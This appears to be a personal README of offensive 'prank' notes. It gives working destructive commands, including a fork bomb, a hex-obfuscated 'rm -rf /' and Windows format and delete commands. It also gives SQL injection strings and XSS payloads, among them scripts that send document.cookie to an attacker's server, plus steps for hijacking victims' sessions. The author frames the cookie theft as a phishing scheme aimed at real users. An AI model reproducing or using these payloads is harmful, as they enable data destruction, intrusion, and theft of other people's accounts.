# pranks
These are my notes on bad things that can happen.  The focus here is programmatic stuff, if application security is your thing then you should check out OWASP Top 10 documentation!  [Click here for the 2017 version of that.](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)
  
## Terminal Commands
For use in a terminal or a command prompt or something  
  
### Fork Bomb
A form of DOS (denial of service) attack.  
The process continually replicates itself to deplete available system resources.  
In shell, it looks like this:  
```shell
:(){ :|: & };:
```
Also possible in C like this:
```c
int main() {
    while(1)
        fork();
    return 0;
}
```
### Deletion
First off, here are some hex shenanigans:
```shell
$(echo 7375646f20726d202d7266202f202d2d6e6f2d70726573657276652d726f6f74 | xxd -r -p)
```
This is hexidecimal, but converted to ascii its:
```shell
sudo rm -rf / --no-preserve-root
```
Which will delete everything from the selected directory.  
This does the same thing in Windows (maybe):  
```shell
Format C: /q /y
```
Supposedly delete windows, but windows will probably try to stop you  
idk I never actually tested it lol
```shell
rd /s /q c:\windows
```
## Stuff for username fields and search bars
For use in the event that you suspect certain technology is being used and want to check.
### SQL Injection
May be able to return all info from users table depending on the db
```SQL
anything';SELECT * FROM users WHERE 't' = 't
```
Error based injection - sql injection to provoke an error message, hopefully revealing sensitive information like db type, etc.  
Should create a statement that's always true and note out the rest of the code with the `--` at the end.
```SQL
SELECT * FROM users WHERE id = 1 OR 1 = 1--
```
Perhaps the application is detecting that you're using a sql injection and is giving you a generic error or no error in response.  If you want to check so see if the sql injection is being processed, try adding a time delay.
```SQL
if (is_srvrolemember('sysadmin') > 0) waitfor delay '0:0:5'
```
^That's for SQLServer, use `SLEEP(seconds)` for MySQL 5
### Cross-Site Scripting
Sometimes if you enter text into a searchbox and the page displays it, it may actually be injecting your input directly into the HTML of the page.  If that's happening, you can use <script> tags to inject code into the page.  Try the below code to see if XSS is possible:
```HTML
<script>alert("You'll see this text in an alert box if so");</script>
```
If you see the above input in plaintext, the page may be putting quotes around your input.  Add a `"` or `">` to the beginning and try again.  So what's the advantage of this?  Well not only can you make a page run script, but if the page displays your search in the URL then you could write your search, take the URL, and hex the search so that you could send the link to someone and they would not see your script unless they converted the hex back to ascii.
Use this converter: https://www.rapidtables.com/convert/number/ascii-to-hex.html
```
http://www.site.com/search.php?q="><script>alert("haxorz")</script>
would instead look like this
http://www.site.com/search.php?q=22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%68%61%78%6f%72%7a%22%29%3c%2f%73%63%72%69%70%74%3e
```
This is the oldest trick in the book and is still pretty common, so if you ever recieve a link from ANYONE with a hexadecimal search query, I always recommend dropping it into a hex/ascii converter so you can inspect it just to be safe (Even if it's a website you trust).  Now simply send a million emails pretending to be someone's grandma asking how to buy a birthday present online and start stealing cookies!
### Cookie stealin
The next part of stealing cookies requires a bit more work.  First you'll need a PHP script (like the one in this repo).  Then make a file called `log.txt`.  You'll need to store the php and log files on a server (I'm not going to walk you though that part, everyone and their mom has their own server.  Ask google if you need help).  I use a Raspberry Pi for this purpose.  Your XSS injection should look something like this:
```HTML
"><script language= "JavaScript">document.location="http://yourServerIpOrDomainName.com/nameOfYourPhpScript.php?cookie=" + document.cookie;document.location="http://www.pageYouWantToExploit.com"</script>
```
This should log the cookie and then redirect the user back to the source page but if you notice this causes an infinit loop, you may need to modify it with an onclick event like this:
```HTML
"><a href="#" onclick="document.location='http://yourServerIpOrDomainName.com/yourServerIpOrDomainName.php?cookie=' +escape(document.cookie);"><Click here if you are not automatically redirected></a></script>
```
The resulting log file should look something like the one in this repo.
### What do I do with this cookie
Sometimes (on poorly made websites) your session id will be displayed in plaintext in the URL.  If that's the case, then accessing somebody else's session is as easy as replacing yours with theirs.  If that's not the case, then you could use a tool like Firebug to edit your cookie.
https://getfirebug.com/
Add or modify all your cookie's fields to match the data from the cookie in your log file and refresh the page.  Now you're logged in as your victim!  Hooray!
